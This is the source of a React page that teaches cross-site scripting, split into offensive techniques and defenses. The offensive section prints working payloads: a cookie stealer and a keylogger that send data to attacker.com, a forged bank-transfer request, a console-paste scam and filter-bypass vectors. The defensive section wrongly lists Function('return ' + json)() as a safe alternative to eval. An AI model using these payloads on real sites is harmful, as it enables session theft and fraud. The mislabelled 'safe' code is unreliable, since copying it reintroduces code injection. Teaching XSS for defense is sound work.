/* eslint-disable react/no-unescaped-entities */
// File: /app/xss/page.tsx
export default function XSSPage() {
  return (




    <main className="p-8 max-w-4xl mx-auto font-sans text-white">
      <h1 className="text-4xl font-extrabold mb-8 text-purple-600">Cross-Site Scripting (XSS)</h1>





      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-3">What is XSS?</h2>
        <p className="leading-relaxed">
          Cross-Site Scripting (XSS) is a client-side vulnerability where attackers inject malicious scripts into web pages viewed by other users. XSS can be used to steal session tokens, deface websites, redirect users, perform actions on behalf of users, and launch other attacks in a users browser.
        </p>
        <div className="mt-4 p-4 bg-gray-800 rounded-lg">
          <h3 className="text-lg font-semibold mb-2 text-orange-300">XSS Impact Severity:</h3>
          <ul className="list-disc list-inside space-y-1">
            <li>Session hijacking (cookie theft)</li>
            <li>Account takeover</li>
            <li>Keylogging and phishing</li>
            <li>Malware distribution</li>
            <li>Website defacement</li>
            <li>Internal network access (via browser)</li>
          </ul>
        </div>
      </section>





      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-red-600">Red Team Techniques (Offensive)</h2>



        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">1. Reflected XSS</h3>
          <p className="mb-3">
            Reflected XSS occurs when malicious scripts are injected into a vulnerable application and immediately reflected back in the response. These attacks require social engineering to trick victims into executing the payload, typically through phishing emails or malicious links.
          </p>
          
          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Basic Payload:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://example.com/search?q=<script>alert(document.domain)</script>`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Simple proof-of-concept demonstrating script execution in victims browser</p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Advanced Exploit (Banking Scenario):</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://bank.com/transfer?amount=1000&to=attacker
<script>
  fetch('/api/transfer', {
    method: 'POST',
    body: JSON.stringify({amount:5000,to:'ATTACKER'}),
    credentials: 'include'
  }).then(() => {
    window.location = 'http://bank.com/confirmation'
  })
</script>`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Silently performs unauthorized transfer while maintaining appearance of legitimacy</p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-2">Bypass Techniques and Obfuscation:</h4>
              <ul className="list-disc list-inside ml-4 space-y-2">
                <li>
                  <strong>Case variation:</strong> <code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</code><br/>
                  <span className="text-sm text-gray-400">Bypasses naive case-sensitive filters</span>
                </li>
                <li>
                  <strong>HTML entity encoding:</strong> <code>&lt;img src=x onerror="&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;"&gt;</code><br/>
                  <span className="text-sm text-gray-400">Evades basic pattern matching</span>
                </li>
                <li>
                  <strong>JavaScript pseudo-protocol:</strong> <code>javascript:alert(document.cookie)</code><br/>
                  <span className="text-sm text-gray-400">Works in href attributes and event handlers</span>
                </li>
                <li>
                  <strong>Unicode encoding:</strong> <code>&lt;img src=x onerror="\u0061\u006C\u0065\u0072\u0074(1)"&gt;</code><br/>
                  <span className="text-sm text-gray-400">Bypasses keyword-based filters</span>
                </li>
              </ul>
            </div>

            <div>
              <h4 className="font-medium mb-1">Delivery Methods:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Phishing emails with malicious links</li>
                <li>Shortened URLs hiding the payload</li>
                <li>Compromised websites redirecting to vulnerable endpoints</li>
                <li>Malicious QR codes</li>
              </ul>
            </div>
          </div>
        </article>







        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">2. Stored XSS (Persistent XSS)</h3>
          <p className="mb-3">
            Stored XSS occurs when malicious scripts are permanently stored on the target server and served to all visitors. This is more dangerous than reflected XSS as it doesn't require social engineering and can affect multiple victims.
          </p>
          
          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Cookie Theft Payload:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      url: window.location.href,
      userAgent: navigator.userAgent
    }),
    mode: 'no-cors',
    credentials: 'include'
  })
</script>`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Comprehensive credential harvesting including session cookies</p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Advanced Keylogger:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`<script>
  const loggedKeys = [];
  const targetForms = ['login', 'payment', 'password'];
  
  document.addEventListener('keypress', (e) => {
    loggedKeys.push({
      key: e.key,
      time: new Date().toISOString(),
      target: e.target.id || e.target.name
    });
  });

  setInterval(() => {
    if (loggedKeys.length > 0) {
      fetch('https://attacker.com/log', {
        method: 'POST',
        body: JSON.stringify(loggedKeys.splice(0)),
        mode: 'no-cors'
      });
    }
  }, 5000);
</script>`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Captures keystrokes with context and timing information</p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Common Injection Points:</h4>
              <ul className="list-disc list-inside ml-4 space-y-2">
                <li>
                  <strong>User-generated content:</strong> Comments, forum posts, product reviews
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>Often vulnerable due to rich text editors or improper sanitization</li>
                  </ul>
                </li>
                <li>
                  <strong>User profiles:</strong> Display names, bios, avatar URLs
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>Profile fields may be displayed to other users without proper escaping</li>
                  </ul>
                </li>
                <li>
                  <strong>Administrative interfaces:</strong> Log viewers, system messages
                  <ul className="list-inside ml-6 text-sm text-gray-400">
                    <li>May be vulnerable if they display unsanitized logs or user input</li>
                  </ul>
                </li>
              </ul>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-1">Persistence Techniques:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Storing payloads in database fields that are displayed to other users</li>
                <li>Infecting cached pages or static resources</li>
                <li>Abusing file upload functionality to store malicious scripts</li>
                <li>Exploiting CMS templates or widgets</li>
              </ul>
            </div>
          </div>
        </article>






        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">3. DOM-Based XSS</h3>
          <p className="mb-3">
            DOM XSS occurs when client-side JavaScript writes attacker-controllable data to dangerous sinks without proper sanitization. Unlike other XSS types, DOM XSS is entirely client-side and doesn't involve the server.
          </p>
          
          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Location.hash Vulnerability:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Vulnerable code in application:
document.getElementById('content').innerHTML = 
  decodeURIComponent(window.location.hash.substring(1));

// Exploit URL:
https://example.com/#<img src=x onerror=alert(1)>`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">User-controlled hash value written directly to innerHTML</p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Common Dangerous Sinks:</h4>
              <table className="w-full border-collapse">
                <thead>
                  <tr className="border-b border-gray-600">
                    <th className="p-2 text-left">Sink</th>
                    <th className="p-2 text-left">Risk</th>
                    <th className="p-2 text-left">Example</th>
                  </tr>
                </thead>
                <tbody>
                  <tr className="border-b border-gray-700">
                    <td className="p-2"><code>innerHTML</code></td>
                    <td className="p-2">High</td>
                    <td className="p-2"><code>element.innerHTML = userInput</code></td>
                  </tr>
                  <tr className="border-b border-gray-700">
                    <td className="p-2"><code>document.write()</code></td>
                    <td className="p-2">High</td>
                    <td className="p-2"><code>document.write('&lt;div&gt;' + input + '&lt;/div&gt;')</code></td>
                  </tr>
                  <tr className="border-b border-gray-700">
                    <td className="p-2"><code>eval()</code></td>
                    <td className="p-2">Critical</td>
                    <td className="p-2"><code>eval('alert("' + input + '")')</code></td>
                  </tr>
                  <tr>
                    <td className="p-2"><code>location</code></td>
                    <td className="p-2">Medium</td>
                    <td className="p-2"><code>location.href = 'javascript:' + input</code></td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div>
              <h4 className="font-medium mb-1">Detection Challenges:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>No server-side payload to detect (pure client-side)</li>
                <li>May only trigger under specific DOM states</li>
                <li>Difficult to identify during static analysis</li>
                <li>Often requires dynamic testing with tools like DOM Invader</li>
              </ul>
            </div>
          </div>
        </article>







        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">4. Self-XSS</h3>
          <p className="mb-3">
            Self-XSS is a social engineering attack in which a victim is tricked into executing malicious scripts in their own browser console. Although it doesnt exploit a vulnerability in the application directly, it can lead to account compromise, data theft, or malware installation by abusing the user's trust and access.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Example Scenario:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// Message shown in a phishing page or chat:
"Paste this code into your browser console to get free credits!"

// Malicious code:
fetch('/api/transfer', {
  method: 'POST',
  body: JSON.stringify({ amount: 5000, to: 'attacker' }),
  credentials: 'include'
})`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                Trick convinces users to execute malicious requests using their own session.
              </p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-2">Why It Works:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>User is authenticated and has elevated permissions (e.g., admin or payment access).</li>
                <li>JavaScript executes in the context of the user's session and domain.</li>
                <li>Trust-based platforms (e.g., gaming or crypto sites) are commonly targeted.</li>
              </ul>
            </div>

          </div>
        </article>






        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">5. Mutated XSS (mXSS)</h3>
          <p className="mb-3">
            Mutated XSS occurs when seemingly harmless input is transformed by the browser or DOM parser into executable JavaScript. Unlike traditional XSS, the original payload does not look dangerous — it becomes malicious only after being interpreted by the browser. This makes mXSS hard to detect and filter.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Example Payload:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`<svg><desc>&lt;script&gt;alert(1)&lt;/script&gt;</desc></svg>`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">
                The input looks harmless when stored, but is reinterpreted by the browser and executed as a script.
              </p>
            </div>

            <div>
              <h4 className="font-medium mb-1">How It Works:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>The browser “fixes” malformed HTML and reconstructs DOM elements differently than intended.</li>
                <li>The mutated structure introduces executable elements like <code>&lt;script&gt;</code> or event handlers.</li>
                <li>Server-side filters may approve input that only becomes dangerous after DOM parsing.</li>
              </ul>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-1">Detection Tips:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Use a live DOM inspection tool (e.g., Chrome DevTools) to see what the browser actually renders.</li>
                <li>Test for injection in non-standard tags like <code>&lt;svg&gt;</code>, <code>&lt;math&gt;</code>, or <code>&lt;foreignObject&gt;</code>.</li>
                <li>Tools like DOMPurify may not protect against mXSS if improperly configured.</li>
                <li>Look for transformations of HTML entities into real tags.</li>
              </ul>
            </div>

            <div>
              <h4 className="font-medium mb-1">Common mXSS Vectors:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li><code>&lt;svg&gt;&lt;desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/desc&gt;&lt;/svg&gt;</code></li>
                <li><code>&lt;math href="javascript:alert(1)"&gt;&lt;/math&gt;</code></li>
                <li><code>&lt;title&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/title&gt;</code></li>
              </ul>
            </div>

          </div>
        </article>




        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-yellow-400">XSS Tools & Automation</h3>

          <h4 className="font-medium mb-1 mt-3">Discovery & Scanning</h4>
          <ul className="list-disc list-inside ml-4 space-y-1 text-gray-300">
            <li>XSStrike – Advanced XSS detection and fuzzing tool</li>
            <li>Katana – Web crawler that detects JavaScript endpoints</li>
            <li>DalFox – Fast and powerful XSS scanner designed for automation</li>
            <li>Burp Suite Scanner – Passive and active scanning for reflected/stored XSS</li>
            <li>OWASP ZAP – Open-source scanner with XSS testing capabilities</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Exploitation & Payload Generation</h4>
          <ul className="list-disc list-inside ml-4 space-y-1 text-gray-300">
            <li>XSStrike – Context-aware payload crafting and bypass techniques</li>
            <li>XSS-Polyglots – Collections of payloads for different contexts (DOM, HTML, JS)</li>
            <li>PayloadBox – Repository of ready-to-use XSS payloads</li>
            <li>Burp Repeater – Manual testing and payload injection</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Post-Exploitation & Reporting</h4>
          <ul className="list-disc list-inside ml-4 space-y-1 text-gray-300">
            <li>BeEF – Browser Exploitation Framework for hooking and post-XSS control</li>
            <li>XSS Hunter – Tracks and logs XSS payload execution with out-of-band callbacks</li>
            <li>Custom alerting and webhook delivery for data exfiltration or proof-of-concept</li>
            <li>Burp Suite – Report generation and export options</li>
          </ul>
        </article>




      </section>










      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-blue-600">Blue Team Defenses (Defensive)</h2>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">1. Input Handling & Validation</h3>
          <p className="mb-3">
            Proper input handling forms the first line of defense against XSS attacks. A multi-layered validation strategy ensures only clean, expected data enters your application.
          </p>
          
          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Comprehensive Validation Strategy:</h4>
              <ul className="list-disc list-inside ml-4 space-y-2">
                <li>
                  <strong>Allowlist Validation:</strong>
                  <pre className="bg-gray-700 p-2 rounded mt-1 text-sm">
{`// Only allow alphanumeric plus basic punctuation
const isValid = /^[a-zA-Z0-9 .,!?-]+$/.test(input);`}
                  </pre>
                  <p className="text-sm text-gray-400">Reject rather than sanitize invalid input</p>
                </li>
                <li>
                  <strong>Type and Length Checking:</strong>
                  <ul className="list-disc list-inside ml-4 text-sm text-gray-400">
                    <li>Enforce maximum lengths for all fields</li>
                    <li>Validate data types (numbers, emails, etc.)</li>
                    <li>Implement business logic validation</li>
                  </ul>
                </li>
                <li>
                  <strong>Context-Specific Rules:</strong>
                  <ul className="list-disc list-inside ml-4 text-sm text-gray-400">
                    <li>Different rules for names vs. addresses vs. HTML content</li>
                    <li>Special handling for rich text editor inputs</li>
                  </ul>
                </li>
              </ul>
            </div>

            <div>
              <h4 className="font-medium mb-1">Trusted Sanitization Libraries:</h4>
              <table className="w-full border-collapse">
                <thead>
                  <tr className="border-b border-gray-600">
                    <th className="p-2 text-left">Library</th>
                    <th className="p-2 text-left">Language</th>
                    <th className="p-2 text-left">Key Features</th>
                  </tr>
                </thead>
                <tbody>
                  <tr className="border-b border-gray-700">
                    <td className="p-2">DOMPurify</td>
                    <td className="p-2">JavaScript</td>
                    <td className="p-2">HTML sanitizer with customizable allowlists</td>
                  </tr>
                  <tr className="border-b border-gray-700">
                    <td className="p-2">OWASP Java Encoder</td>
                    <td className="p-2">Java</td>
                    <td className="p-2">Context-aware encoding for multiple output contexts</td>
                  </tr>
                  <tr className="border-b border-gray-700">
                    <td className="p-2">HTMLSanitizer</td>
                    <td className="p-2">.NET</td>
                    <td className="p-2">Configurable HTML sanitization with safe lists</td>
                  </tr>
                  <tr>
                    <td className="p-2">bleach</td>
                    <td className="p-2">Python</td>
                    <td className="p-2">Whitelist-based HTML sanitization</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="p-3 bg-blue-900/30 rounded">
              <h4 className="font-medium mb-1">Implementation Checklist:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Validate on both client and server sides</li>
                <li>Normalize input before validation (Unicode, encoding)</li>
                <li>Log validation failures for monitoring</li>
                <li>Regularly update validation patterns</li>
              </ul>
            </div>
          </div>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">2. Output Encoding & Context Awareness</h3>
          <p className="mb-3">
            Proper output encoding ensures user-supplied data is safely rendered in different contexts. The correct encoding depends on where the data is being inserted.
          </p>
          
          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Context-Specific Encoding Guide:</h4>
              <table className="w-full border-collapse">
                <thead>
                  <tr className="border-b border-gray-600">
                    <th className="p-2 text-left">Context</th>
                    <th className="p-2 text-left">Encoding Method</th>
                    <th className="p-2 text-left">Example</th>
                  </tr>
                </thead>
                <tbody>
                  <tr className="border-b border-gray-700">
                    <td className="p-2">HTML Body</td>
                    <td className="p-2">HTML Entity Encoding</td>
                    <td className="p-2"><code>&amp;lt;script&amp;gt;</code></td>
                  </tr>
                  <tr className="border-b border-gray-700">
                    <td className="p-2">HTML Attribute</td>
                    <td className="p-2">Attribute Encoding</td>
                    <td className="p-2"><code>"&gt;&lt;script&gt;</code></td>
                  </tr>
                  <tr className="border-b border-gray-700">
                    <td className="p-2">JavaScript</td>
                    <td className="p-2">JavaScript Encoding</td>
                    <td className="p-2"><code>\x3cscript\x3e</code></td>
                  </tr>
                  <tr>
                    <td className="p-2">URL</td>
                    <td className="p-2">URL Encoding</td>
                    <td className="p-2"><code>%3Cscript%3E</code></td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div>
              <h4 className="font-medium mb-1">Framework Auto-Escaping Features:</h4>
              <ul className="list-disc list-inside ml-4 space-y-2">
                <li>
                  <strong>React:</strong>
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>Automatic JSX escaping</li>
                    <li>DangerouslySetInnerHTML for explicit raw HTML</li>
                  </ul>
                </li>
                <li>
                  <strong>Angular:</strong>
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>Template sanitization</li>
                    <li>DomSanitizer service for bypass cases</li>
                  </ul>
                </li>
                <li>
                  <strong>Vue:</strong>
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>Automatic escaping in templates</li>
                    <li>v-html directive for explicit raw HTML</li>
                  </ul>
                </li>
              </ul>
            </div>

            <div className="p-3 bg-blue-900/30 rounded">
              <h4 className="font-medium mb-1">Dangerous APIs to Avoid:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`// UNSAFE PATTERNS
element.innerHTML = userData;       // Direct HTML injection
document.write(userInput);          // Document writing
eval(userControlledString);         // Dynamic code execution
setTimeout(userInput);              // String evaluation
location.href = userControlledURL;  // JavaScript URLs

// SAFE ALTERNATIVES
element.textContent = userData;     // Text-only
document.createElement();           // DOM manipulation
Function('return ' + json)();       // JSON parsing only
setTimeout(function() {...}, 0);    // Function reference
new URL(userInput).toString();      // Validated URLs`}
              </pre>
            </div>
          </div>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">3. Content Security Policy (CSP)</h3>
          <p className="mb-3">
            CSP provides an additional layer of security that helps mitigate XSS attacks by restricting the sources of executable content. A well-configured CSP can prevent many XSS attacks even if they bypass other defenses.
          </p>
          
          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Optimal CSP Configuration:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`Content-Security-Policy:
  default-src 'none';                 # Default deny
  script-src 'self' 'nonce-{random}'; # Only same-origin + nonced scripts
  style-src 'self' 'unsafe-inline';   # Inline styles allowed
  img-src 'self' data:;               # Images from self and data URIs
  connect-src 'self';                 # XHR/fetch to same origin
  font-src 'self';                    # Fonts from same origin
  object-src 'none';                  # No Flash/plugins
  frame-src 'none';                   # No iframes
  base-uri 'self';                    # Restrict base URLs
  form-action 'self';                 # Form submission targets
  report-uri /csp-report;             # Violation reporting
  report-to csp-endpoint;             # New reporting standard`}
              </pre>
            </div>

            <div>
              <h4 className="font-medium mb-1">CSP Implementation Strategy:</h4>
              <ol className="list-decimal list-inside ml-4 space-y-2">
                <li>
                  <strong>Start with Report-Only mode:</strong>
                  <pre className="bg-gray-700 p-2 rounded mt-1 text-sm">
{`Content-Security-Policy-Report-Only: ...`}
                  </pre>
                </li>
                <li>
                  <strong>Use nonces or hashes for inline scripts:</strong>
                  <pre className="bg-gray-700 p-2 rounded mt-1 text-sm">
{`<script nonce="EDNnf03nceIOfn39fn3e9h3sdfa">
  // Inline script allowed by CSP
</script>`}
                  </pre>
                </li>
                <li>
                  <strong>Restrict object-src and frame-src to 'none':</strong>
                  <p className="text-sm text-gray-400">Prevents Flash-based and frame-based attacks</p>
                </li>
                <li>
                  <strong>Implement reporting:</strong>
                  <p className="text-sm text-gray-400">Monitor for violations before enforcement</p>
                </li>
              </ol>
            </div>

            <div className="p-3 bg-blue-900/30 rounded">
              <h4 className="font-medium mb-1">CSP Deployment Checklist:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Test with CSP Evaluator tool</li>
                <li>Monitor reports before enforcement</li>
                <li>Gradually tighten policy</li>
                <li>Document all exceptions</li>
                <li>Review policy quarterly</li>
              </ul>
            </div>
          </div>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">4. Secure Session Management</h3>
          <p className="mb-3">
            Proper session management limits the impact of successful XSS attacks by reducing the window of opportunity and protecting sensitive session tokens.
          </p>
          
          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Secure Cookie Attributes:</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`Set-Cookie: 
  sessionId=abc123; 
  Secure;               # HTTPS only
  HttpOnly;             # No JavaScript access
  SameSite=Lax;         # CSRF protection
  Path=/;               # Accessible site-wide
  Domain=example.com;   # Specific domain
  Max-Age=3600;         # 1 hour expiration
  Priority=High;        # Defense against CRIME`}
              </pre>
            </div>

            <div>
              <h4 className="font-medium mb-1">Advanced Session Protections:</h4>
              <ul className="list-disc list-inside ml-4 space-y-2">
                <li>
                  <strong>Short-Lived Sessions:</strong>
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>15-30 minute inactivity timeouts</li>
                    <li>Absolute maximum of 4-8 hours</li>
                  </ul>
                </li>
                <li>
                  <strong>Contextual Validation:</strong>
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>IP address fingerprinting</li>
                    <li>User-Agent consistency checks</li>
                    <li>Geolocation verification</li>
                  </ul>
                </li>
                <li>
                  <strong>JWT Best Practices:</strong>
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>Short expiration times (minutes not hours)</li>
                    <li>HMAC with strong secrets</li>
                    <li>Storage in httpOnly cookies (not localStorage)</li>
                  </ul>
                </li>
              </ul>
            </div>

            <div className="p-3 bg-blue-900/30 rounded">
              <h4 className="font-medium mb-1">Session Hardening Checklist:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Implement all recommended cookie flags</li>
                <li>Use session rotation after login</li>
                <li>Require re-authentication for sensitive actions</li>
                <li>Monitor for concurrent sessions</li>
                <li>Implement session termination API</li>
              </ul>
            </div>
          </div>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">5. Monitoring & Incident Response</h3>
          <p className="mb-3">
            Effective monitoring detects XSS attempts and successful attacks, while a prepared incident response plan minimizes damage when breaches occur.
          </p>
          
          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Detection Techniques:</h4>
              <ul className="list-disc list-inside ml-4 space-y-2">
                <li>
                  <strong>Web Application Firewalls (WAF):</strong>
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>Signature-based detection of XSS patterns</li>
                    <li>Behavioral analysis of suspicious inputs</li>
                  </ul>
                </li>
                <li>
                  <strong>Static Application Security Testing (SAST):</strong>
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>Code analysis for vulnerable patterns</li>
                    <li>Integration in CI/CD pipelines</li>
                  </ul>
                </li>
                <li>
                  <strong>Dynamic Analysis (DAST):</strong>
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>Automated scanning of running applications</li>
                    <li>Regular scheduled scans</li>
                  </ul>
                </li>
              </ul>
            </div>

            <div>
              <h4 className="font-medium mb-1">Incident Response Plan:</h4>
              <ol className="list-decimal list-inside ml-4 space-y-2">
                <li>
                  <strong>Containment:</strong>
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>Remove malicious content</li>
                    <li>Force session termination</li>
                    <li>Block attack sources</li>
                  </ul>
                </li>
                <li>
                  <strong>Investigation:</strong>
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>Forensic analysis of logs</li>
                    <li>Determine attack vector</li>
                    <li>Identify affected users</li>
                  </ul>
                </li>
                <li>
                  <strong>Remediation:</strong>
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>Patch vulnerabilities</li>
                    <li>Rotate secrets</li>
                    <li>Update defenses</li>
                  </ul>
                </li>
                <li>
                  <strong>Communication:</strong>
                  <ul className="list-disc list-inside ml-6 text-sm text-gray-400">
                    <li>Notify affected users</li>
                    <li>Internal reporting</li>
                    <li>Post-mortem analysis</li>
                  </ul>
                </li>
              </ol>
            </div>

            <div className="p-3 bg-blue-900/30 rounded">
              <h4 className="font-medium mb-1">Continuous Improvement:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Regular security training for developers</li>
                <li>Quarterly penetration testing</li>
                <li>Bug bounty programs</li>
                <li>Threat modeling sessions</li>
              </ul>
            </div>
          </div>
        </article>
      </section>

      <div className="mb-12 p-4 bg-gray-800 rounded-lg border-l-4 border-blue-500">
        <h3 className="text-lg font-semibold mb-2 text-blue-400">XSS Mitigation Checklist</h3>
        <ul className="list-disc list-inside ml-4 space-y-1">
          <li>Implement strict input validation (allowlist approach)</li>
          <li>Use context-aware output encoding</li>
          <li>Deploy Content Security Policy (CSP)</li>
          <li>Set HttpOnly and Secure flags on cookies</li>
          <li>Use modern frameworks with built-in protections</li>
          <li>Regularly scan for vulnerabilities</li>
          <li>Educate developers about secure coding practices</li>
        </ul>
      </div>

      <section className="mb-12">
        <h2 className="text-3xl font-semibold mb-4">Additional Resources & References</h2>
        <div className="space-y-6">
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Learning Resources</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://owasp.org/www-community/attacks/xss/" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  OWASP XSS — Complete documentation and examples
                </a>
              </li>
              <li>
                <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  PortSwigger XSS Academy — Interactive labs
                </a>
              </li>
              <li>
                <a href="https://csp.withgoogle.com/docs/index.html" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  Google CSP Guide — Comprehensive CSP reference
                </a>
              </li>
            </ul>
          </div>
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Security Tools</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://beefproject.com/" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  BeEF — Browser Exploitation Framework
                </a>
              </li>
              <li>
                <a href="https://github.com/mandatoryprogrammer/xsshunter" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  XSS Hunter — Blind XSS platform
                </a>
              </li>
              <li>
                <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  OWASP XSS Prevention Cheat Sheet
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>

    </main>
  );
}
